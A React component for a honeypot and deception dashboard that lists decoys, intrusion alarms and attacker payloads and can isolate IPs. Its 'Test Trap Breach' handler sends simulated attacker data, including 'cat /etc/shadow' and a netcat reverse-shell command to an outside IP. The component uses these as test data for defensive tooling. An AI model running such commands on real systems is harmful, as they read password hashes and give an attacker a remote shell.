import React, { useEffect, useState } from 'react';
import { apiClient } from '../api/client';
import {
  Skull,
  Plus,
  Radio,
  AlertOctagon,
  ShieldAlert,
  Terminal,
  Key,
  Database,
  Lock,
  Play,
  RotateCw,
  CheckCircle2,
  X,
  Eye,
  FileCode,
} from 'lucide-react';

export const DeceptionEnginePage: React.FC = () => {
  const [decoys, setDecoys] = useState<any[]>([]);
  const [interactions, setInteractions] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [containingId, setContainingId] = useState<string | null>(null);
  const [simulating, setSimulating] = useState(false);
  const [selectedPayload, setSelectedPayload] = useState<string | null>(null);

  const loadData = async () => {
    try {
      const [decRes, intRes]: any = await Promise.all([
        apiClient.get('/deception/decoys'),
        apiClient.get('/deception/interactions'),
      ]);

      if (decRes.success) setDecoys(decRes.data);
      if (intRes.success) setInteractions(intRes.data);
    } catch (err) {
      console.error('Failed to load deception data', err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    loadData();
  }, []);

  const handleSimulateIntrusion = async (decoyId: string) => {
    setSimulating(true);
    try {
      const res: any = await apiClient.post('/deception/simulate', {
        decoyId,
        attackerIp: '185.220.101.99',
        userAgent: 'Kali Linux Exploit Framework',
        commandsAttempted: ['cat /etc/shadow', 'nc -e /bin/bash 185.220.101.99 4444'],
      });
      if (res.success) loadData();
    } catch (err: any) {
      alert(err.message || 'Failed to simulate honeypot intrusion');
    } finally {
      setSimulating(false);
    }
  };

  const handleContainAttacker = async (interactionId: string) => {
    setContainingId(interactionId);
    try {
      const res: any = await apiClient.post(`/deception/interactions/${interactionId}/contain`, {});
      if (res.success) loadData();
    } catch (err: any) {
      alert(err.message || 'Failed to contain attacker');
    } finally {
      setContainingId(null);
    }
  };

  if (loading) {
    return (
      <div style={{ padding: '40px', color: 'var(--accent-cyan)', fontFamily: 'var(--font-mono)' }}>
        [SENTINELX DECEPTION ENGINE] PROVISIONING DECOY FLEET & HONEYTOKENS...
      </div>
    );
  }

  const triggeredCount = decoys.filter((d) => d.status === 'TRIGGERED').length;
  const activeAlarmsCount = interactions.filter((i) => i.status === 'ALARM_ACTIVE').length;

  return (
    <div style={{ padding: '32px', display: 'flex', flexDirection: 'column', gap: '28px' }}>
      {/* Top Header */}
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
        <div>
          <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
            <Skull size={28} color="var(--accent-rose)" />
            <h2 style={{ fontSize: '1.75rem', fontWeight: 800 }}>Deception & Active Honeypot Control Engine</h2>
          </div>
          <p style={{ fontSize: '0.875rem', color: 'var(--text-muted)', marginTop: '4px' }}>
            Decoy SSH Gateways, Database Honeypots & Fake AWS Honeytokens with Zero False-Positive Alarms
          </p>
        </div>
      </div>

      {/* Metric Cards Tally */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '20px' }}>
        <div className="glass-panel" style={{ padding: '24px' }}>
          <div style={{ fontSize: '0.8rem', color: 'var(--accent-cyan)', fontFamily: 'var(--font-mono)', fontWeight: 600, marginBottom: '8px' }}>
            DEPLOYED DECOY FLEET
          </div>
          <div style={{ fontSize: '2.25rem', fontWeight: 800, color: 'var(--accent-cyan)' }}>
            {decoys.length} DECOYS
          </div>
          <div style={{ fontSize: '0.75rem', color: 'var(--text-muted)', marginTop: '6px' }}>
            SSH, DB & Honeytokens
          </div>
        </div>

        <div className="glass-panel glass-panel-danger" style={{ padding: '24px' }}>
          <div style={{ fontSize: '0.8rem', color: 'var(--accent-rose)', fontFamily: 'var(--font-mono)', fontWeight: 600, marginBottom: '8px' }}>
            ACTIVE INTRUSION ALARMS
          </div>
          <div style={{ fontSize: '2.25rem', fontWeight: 800, color: 'var(--accent-rose)' }}>
            {activeAlarmsCount}
          </div>
          <div style={{ fontSize: '0.75rem', color: 'var(--text-muted)', marginTop: '6px' }}>
            Zero false-positive hits
          </div>
        </div>

        <div className="glass-panel" style={{ padding: '24px' }}>
          <div style={{ fontSize: '0.8rem', color: 'var(--accent-amber)', fontFamily: 'var(--font-mono)', fontWeight: 600, marginBottom: '8px' }}>
            TRIGGERED HONEYPOTS
          </div>
          <div style={{ fontSize: '2.25rem', fontWeight: 800, color: 'var(--accent-amber)' }}>
            {triggeredCount}
          </div>
          <div style={{ fontSize: '0.75rem', color: 'var(--text-muted)', marginTop: '6px' }}>
            Breached decoy assets
          </div>
        </div>

        <div className="glass-panel" style={{ padding: '24px' }}>
          <div style={{ fontSize: '0.8rem', color: 'var(--accent-emerald)', fontFamily: 'var(--font-mono)', fontWeight: 600, marginBottom: '8px' }}>
            AUTO IP CONTAINMENT
          </div>
          <div style={{ fontSize: '1.75rem', fontWeight: 800, color: 'var(--accent-emerald)' }}>
            FULL AUTO
          </div>
          <div style={{ fontSize: '0.75rem', color: 'var(--text-muted)', marginTop: '6px' }}>
            Instant firewall drops
          </div>
        </div>
      </div>

      {/* Decoy Fleet Grid Table */}
      <div className="glass-panel" style={{ overflow: 'hidden' }}>
        <div style={{ padding: '20px 24px', borderBottom: '1px solid var(--border-color)', fontSize: '1.1rem', fontWeight: 700, display: 'flex', alignItems: 'center', gap: '8px' }}>
          <Radio size={18} color="var(--accent-cyan)" /> Deployed Cyber Decoys & Honeytokens
        </div>

        <table style={{ width: '100%', borderCollapse: 'collapse', textAlign: 'left' }}>
          <thead>
            <tr style={{ background: 'rgba(11, 15, 25, 0.9)', borderBottom: '1px solid var(--border-color)' }}>
              <th style={{ padding: '16px 24px', fontSize: '0.75rem', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>DECOY NAME</th>
              <th style={{ padding: '16px 24px', fontSize: '0.75rem', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>DECOY TYPE</th>
              <th style={{ padding: '16px 24px', fontSize: '0.75rem', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>TARGET / HONEYTOKEN VALUE</th>
              <th style={{ padding: '16px 24px', fontSize: '0.75rem', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>STATUS</th>
              <th style={{ padding: '16px 24px', fontSize: '0.75rem', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>INTERACTIONS</th>
              <th style={{ padding: '16px 24px', fontSize: '0.75rem', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>ACTIONS</th>
            </tr>
          </thead>
          <tbody>
            {decoys.map((dec) => (
              <tr key={dec.id} style={{ borderBottom: '1px solid rgba(56, 189, 248, 0.08)' }}>
                <td style={{ padding: '16px 24px', fontSize: '0.9rem', fontWeight: 700 }}>
                  {dec.name}
                </td>

                <td style={{ padding: '16px 24px' }}>
                  <span className="badge badge-purple">{dec.type}</span>
                </td>

                <td style={{ padding: '16px 24px', fontSize: '0.82rem', fontFamily: 'var(--font-mono)', color: 'var(--accent-cyan)' }}>
                  {dec.tokenValue || dec.target}
                </td>

                <td style={{ padding: '16px 24px' }}>
                  <span className={dec.status === 'TRIGGERED' ? 'badge badge-rose' : 'badge badge-emerald'}>
                    {dec.status}
                  </span>
                </td>

                <td style={{ padding: '16px 24px', fontSize: '0.88rem', fontWeight: 700, fontFamily: 'var(--font-mono)' }}>
                  {dec.interactionsCount}
                </td>

                <td style={{ padding: '16px 24px' }}>
                  <button
                    className="btn-primary"
                    style={{ fontSize: '0.75rem', padding: '6px 10px' }}
                    disabled={simulating}
                    onClick={() => handleSimulateIntrusion(dec.id)}
                  >
                    <Skull size={12} /> Test Trap Breach
                  </button>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      {/* Attacker Interactions & Alarm Logs */}
      <div className="glass-panel" style={{ overflow: 'hidden' }}>
        <div style={{ padding: '20px 24px', borderBottom: '1px solid var(--border-color)', fontSize: '1.1rem', fontWeight: 700, display: 'flex', alignItems: 'center', gap: '8px' }}>
          <AlertOctagon size={18} color="var(--accent-rose)" /> Zero-False-Positive Intrusion Alarms & Attacker Fingerprints
        </div>

        <table style={{ width: '100%', borderCollapse: 'collapse', textAlign: 'left' }}>
          <thead>
            <tr style={{ background: 'rgba(11, 15, 25, 0.9)', borderBottom: '1px solid var(--border-color)' }}>
              <th style={{ padding: '16px 24px', fontSize: '0.75rem', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>TIMESTAMP</th>
              <th style={{ padding: '16px 24px', fontSize: '0.75rem', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>BREACHED DECOY</th>
              <th style={{ padding: '16px 24px', fontSize: '0.75rem', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>ATTACKER IP</th>
              <th style={{ padding: '16px 24px', fontSize: '0.75rem', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>USER AGENT / FINGERPRINT</th>
              <th style={{ padding: '16px 24px', fontSize: '0.75rem', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>STATUS</th>
              <th style={{ padding: '16px 24px', fontSize: '0.75rem', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>ACTIONS</th>
            </tr>
          </thead>
          <tbody>
            {interactions.map((inter) => (
              <tr key={inter.id} style={{ borderBottom: '1px solid rgba(56, 189, 248, 0.08)' }}>
                <td style={{ padding: '16px 24px', fontSize: '0.78rem', fontFamily: 'var(--font-mono)' }}>
                  {new Date(inter.timestamp).toLocaleString()}
                </td>

                <td style={{ padding: '16px 24px', fontSize: '0.85rem', fontWeight: 600 }}>
                  {inter.decoy?.name || 'Decoy Asset'}
                </td>

                <td style={{ padding: '16px 24px', fontSize: '0.88rem', fontWeight: 700, fontFamily: 'var(--font-mono)', color: 'var(--accent-rose)' }}>
                  {inter.attackerIp}
                </td>

                <td style={{ padding: '16px 24px', fontSize: '0.75rem', fontFamily: 'var(--font-mono)', color: 'var(--text-muted)' }}>
                  {inter.userAgent}
                </td>

                <td style={{ padding: '16px 24px' }}>
                  <span className={inter.status === 'CONTAINED' ? 'badge badge-emerald' : 'badge badge-rose'}>
                    {inter.status}
                  </span>
                </td>

                <td style={{ padding: '16px 24px' }}>
                  <div style={{ display: 'flex', gap: '8px' }}>
                    <button
                      className="btn-secondary"
                      style={{ fontSize: '0.72rem', padding: '4px 8px' }}
                      onClick={() => setSelectedPayload(inter.payload)}
                    >
                      <Eye size={12} /> Inspect Dump
                    </button>

                    {inter.status === 'ALARM_ACTIVE' && (
                      <button
                        className="btn-primary"
                        style={{ fontSize: '0.72rem', padding: '4px 8px' }}
                        disabled={containingId === inter.id}
                        onClick={() => handleContainAttacker(inter.id)}
                      >
                        {containingId === inter.id ? <RotateCw size={12} className="spin" /> : <Lock size={12} />}
                        Isolate IP
                      </button>
                    )}
                  </div>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      {/* Payload Modal */}
      {selectedPayload && (
        <div style={{ position: 'fixed', inset: 0, background: 'rgba(6, 8, 19, 0.85)', backdropFilter: 'blur(8px)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 1000 }}>
          <div className="glass-panel" style={{ width: '550px', padding: '32px', display: 'flex', flexDirection: 'column', gap: '20px' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', borderBottom: '1px solid var(--border-color)', paddingBottom: '16px' }}>
              <h3 style={{ fontSize: '1.2rem', fontWeight: 800, display: 'flex', alignItems: 'center', gap: '8px' }}>
                <FileCode size={20} color="var(--accent-rose)" /> Attacker Payload & Credential Dump
              </h3>
              <button onClick={() => setSelectedPayload(null)} style={{ background: 'transparent', border: 'none', color: 'var(--text-muted)', cursor: 'pointer' }}>
                <X size={20} />
              </button>
            </div>

            <pre style={{ padding: '16px', borderRadius: '8px', background: 'rgba(6, 8, 19, 0.95)', border: '1px solid var(--border-color)', fontSize: '0.82rem', lineHeight: '1.5', overflowX: 'auto', fontFamily: 'var(--font-mono)', color: 'var(--accent-rose)' }}>
              {selectedPayload}
            </pre>

            <button className="btn-secondary" onClick={() => setSelectedPayload(null)}>
              Close Inspector
            </button>
          </div>
        </div>
      )}
    </div>
  );
};
